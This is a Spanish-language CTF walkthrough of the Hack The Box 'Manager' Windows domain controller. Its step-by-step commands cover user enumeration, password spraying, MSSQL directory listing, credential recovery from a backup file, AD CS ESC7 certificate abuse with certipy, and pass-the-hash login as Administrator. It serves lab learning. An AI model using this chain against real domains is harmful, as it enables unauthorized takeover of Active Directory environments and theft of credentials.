---
redirect_from:
  - /posts/MANAGER-WriteUp/

title: "Manager - WriteUp"
date: Fri Mar 28 2025 12:45:00 GMT+0100 (Central European Standard Time)
categories: [WriteUps, HTB, Windows]
tags: [ctf, nmap, htb, dirb, winrm, powershell, certify, gobuster, evil-winrm, mssql]
image: /assets/img/htb-writeups/Pasted-image-20231205195606.png
---

{% include machine-info.html
  machine="Manager"
  os="Windows"
  difficulty="Medium"
  platform="HTB"
%}

![Manager](/assets/img/htb-writeups/Pasted-image-20231205195606.png)

------

Máquina Windows
Dificultad Media

------

NMAP

```bash
# Nmap 7.94SVN scan initiated Tue Dec  5 19:48:43 2023 as: nmap -sCV -p 53,80,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49667,49693,49694,49695,49730,50217,53571 --stylesheet=https://raw.githubusercontent.com/honze-net/nmap-bootstrap-xsl/stable/nmap-bootstrap.xsl -oN targeted -oX targetedXML 10.129.159.47
Nmap scan report for 10.129.159.47
Host is up (0.10s latency).

PORT      STATE    SERVICE       VERSION
53/tcp    open     domain        Simple DNS Plus
80/tcp    open     http          Microsoft IIS httpd 10.0
|_http-title: Manager
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2023-12-06 01:48:51Z)
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
|_ssl-date: 2023-12-06T01:50:22+00:00; +7h00m00s from scanner time.
445/tcp   open     microsoft-ds?
464/tcp   open     kpasswd5?
593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-12-06T01:50:23+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
1433/tcp  open     ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2023-12-06T01:50:22+00:00; +7h00m00s from scanner time.
| ms-sql-ntlm-info: 
|   10.129.159.47:1433: 
|     Target_Name: MANAGER
|     NetBIOS_Domain_Name: MANAGER
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: manager.htb
|     DNS_Computer_Name: dc01.manager.htb
|     DNS_Tree_Name: manager.htb
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-12-06T01:26:59
|_Not valid after:  2053-12-06T01:26:59
| ms-sql-info: 
|   10.129.159.47:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
|_ssl-date: 2023-12-06T01:50:22+00:00; +7h00m00s from scanner time.
3269/tcp  open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-12-06T01:50:23+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open     mc-nmf        .NET Message Framing
49667/tcp open     msrpc         Microsoft Windows RPC
49693/tcp open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
49694/tcp open     msrpc         Microsoft Windows RPC
49695/tcp open     msrpc         Microsoft Windows RPC
49730/tcp open     msrpc         Microsoft Windows RPC
50217/tcp filtered unknown
53571/tcp open     msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-12-06T01:49:42
|_  start_date: N/A
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```

Añadimos dc01.manager.htb y manager.htb al fichero hosts.

HTTP

![MANAGER](/assets/img/htb-writeups/Pasted-image-20231205195606.png)

Empezamos a enumerar servicios.

SMBMAP

```bash
$ smbmap -H DC01 -u 'user'
```

![MANAGER](/assets/img/htb-writeups/Pasted-image-20231205210726.png)

FUZZING

```bash
$ gobuster dir -u http://10.129.159.47 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 200 -x txt,php,asp,aspx
```

![MANAGER](/assets/img/htb-writeups/Pasted-image-20231205210916.png)

Vamos a probar de enumerar usuarios válidos aprovechando que la máquina tiene el servicio _Kerberos_ activo (puerto 88)

```bash
$ kerbrute userenum --dc DC01 -d manager.htb /usr/share/seclists/Usernames/Names/usernames.txt
```

![MANAGER](/assets/img/htb-writeups/Pasted-image-20231205215034.png)

Vamos a probar de enumerar por fuerza bruta los RID del dominio:

```bash
$ crackmapexec smb DC01 -u anonymous -p "" --rid-brute 10000
```

![MANAGER](/assets/img/htb-writeups/Pasted-image-20231205224830.png)

Tenemos lista de usuarios. Pero como no tenemos contraseñas, vamos a probar de intentar las credenciales típicas en que la contraseña es igual que el usuario.

Creamos una lista con los usuarios encontrados y los guardamos en _users.txt_.

```bash
$ crackmapexec smb 10.129.159.47 -u users.txt -p users.txt --no-bruteforce --continue-on-success
```

![MANAGER](/assets/img/htb-writeups/Pasted-image-20231205230043.png)

Ahora vamos a probar las mismas combinatorias con el servidor MS SQL:

```bash
crackmapexec mssql DC01 -u users.txt -p users.txt --no-bruteforce --continue-on-success | grep '+'
```

![MANAGER](/assets/img/htb-writeups/Pasted-image-20231206122800.png)

Y tenemos un ganador...

Vamos a loguearnos en el servidor MSSQL:

```bash
$ impacket-mssqlclient -p 1433 operator@DC01 -windows-auth
```

![MANAGER](/assets/img/htb-writeups/Pasted-image-20231206125846.png)

Exploro todas las tablas pero no encuentro datos relevantes. 

Seguimos intentando enumerar más cosas...

Buscamos info sobre cómo ejecutar comandos y encontramos esto: https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server?source=post_page-----c56f238991c0--------------------------------

Probamos los siguientes comandos:

```SQL
> EXEC xp_dirtree 'C:\inetpub\wwwroot', 1, 1;
```

![MANAGER](/assets/img/htb-writeups/Pasted-image-20231206132746.png)

Y vemos que podemos listar archivos. También nos llama la atención este archivo de backup. Vamos a intentar descargarlo para ver qué contiene.

Nos vamos al navegador y en la URL escribimos directamente el nombre del archivo:

```http
http://10.129.52.205/website-backup-27-07-23-old.zip
```

![MANAGER](/assets/img/htb-writeups/Pasted-image-20231206133324.png)

Y nos lo descarga. Vamos a ver qué contiene.

![MANAGER](/assets/img/htb-writeups/Pasted-image-20231206133523.png)

Y en el archivo ".old-conf.xml" encontramos unas credenciales!

![MANAGER](/assets/img/htb-writeups/Pasted-image-20231206133637.png)

```http
raven@manager.htb:R4v3nBe5tD3veloP3r!123
```

Vamos a probarlas para ver qué encontramos:

```bash
$ crackmapexec winrm 10.129.52.205 -u 'raven' -p 'R4v3nBe5tD3veloP3r!123'
```

![MANAGER](/assets/img/htb-writeups/Pasted-image-20231206134409.png)

Y tenemos acceso de administración remota!

Conectamos por WinRM y pa dentro!

```bash
$ evil-winrm -i 10.129.52.205 -u 'raven' -p 'R4v3nBe5tD3veloP3r!123'
```

![MANAGER](/assets/img/htb-writeups/Pasted-image-20231206134542.png)

Ahora puede un buen momento para registra la bandera de usuario que está en la carpeta Desktop del usuario _raven_.

Hecho esto comenzamos la enumeración para escalar privilegios.

```PowerShell
> whoami /all
```

![MANAGER](/assets/img/htb-writeups/Pasted-image-20231206141409.png)

Vemos que el usuario es capaz de emitir certificados de acceso DCOM y agregar equipos al dominio.

Subimos la utilidad _Certify.exe_ para ver todo lo relacionado con certificados y de paso si contiene vulnerabilidades.

```PowerShell
> .\Certify.exe find /vulnerable
```

![MANAGER](/assets/img/htb-writeups/Pasted-image-20231206141728.png)

No tiene vulnerabilidades en principio pero si es capaz de manejar certificados.

```bash
certipy find -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.52.205
```

![MANAGER](/assets/img/htb-writeups/Pasted-image-20231206142252.png)

![MANAGER](/assets/img/htb-writeups/Pasted-image-20231206142756.png)

Ahora vamos a lanzar un churraco de comando sacado de _HackTricks_ y _GiHub_:

https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation?source=post_page-----c56f238991c0--------------------------------

https://github.com/ly4k/Certipy?source=post_page-----c56f238991c0--------------------------------#esc7

Aquí está el comando resultante:
```bash
$ certipy ca -ca 'manager-DC01-CA' -add-officer raven -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' && certipy ca -ca 'manager-DC01-CA' -enable-template SubCA -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' && certipy req -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -target manager.htb -template SubCA -upn administrator@manager.htb && certipy ca -ca "manager-DC01-CA" -issue-request 17 -username 'raven@manager.htb' -password 'R4v3nBe5tD3veloP3r!123' && certipy req -username 'raven@manager.htb' -password 'R4v3nBe5tD3veloP3r!123' -ca "manager-DC01-CA" -target manager.htb -retrieve 17
```

![MANAGER](/assets/img/htb-writeups/Pasted-image-20231206151835.png)

Ya tenemos el certificado de Administrator firmado. 

Vamos a solicitarlo.

Primero sincronizaremos el reloj con el servidor DC:

```bash
sudo ntpdate -u manager.htb
```

Y solicitamos el hash TGT:

```bash
$ certipy auth -pfx administrator.pfx -dc-ip 10.129.52.205
...
Certipy v4.3.0 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@manager.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@manager.htb': aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef
```

Confirmamos que el hash es válido:

```bash
$ crackmapexec winrm 10.129.52.205 -u 'Administrator' -H 'ae5064c2f62317332c88629e025924ef'
SMB         10.129.52.205   5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:manager.htb)
HTTP        10.129.52.205   5985   DC01             [*] http://10.129.52.205:5985/wsman
WINRM       10.129.52.205   5985   DC01             [+] manager.htb\Administrator:ae5064c2f62317332c88629e025924ef '(Pwn3d!)'
```

Perfecto! ahora solo debemos conectar por WinRM y registrar la bandera de Administrador!

```bash
$ evil-winrm -i 10.129.52.205 -u 'Administrator' -H 'ae5064c2f62317332c88629e025924ef'
```

![MANAGER](/assets/img/htb-writeups/Pasted-image-20231206160634.png)

Reto conseguido! Yeah!
---

**Última actualización**: 2025-03-28<br>
**Autor**: A. Lorente<br>
**Licencia**: Creative Commons BY-NC-SA 4.0
